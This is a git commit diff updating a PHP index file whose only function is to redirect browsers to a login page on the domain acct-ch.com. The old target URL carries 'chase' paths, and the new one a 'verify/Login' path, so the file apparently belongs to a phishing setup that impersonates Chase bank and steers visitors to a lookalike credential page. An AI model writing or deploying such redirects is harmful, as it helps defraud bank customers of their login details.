cd6f1d53a786b151bb43196f49c85ef4f880542f
Darkslim104 <100035145+Darkslim104@users.noreply.github.com>
2022-03-23 12:23:53 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://acct-ch.com/chase/Login/login?chase_id=&country=&iso="); 
+header("Location: https://acct-ch.com/verify/Login"); 
   
 exit; 
 ?> 
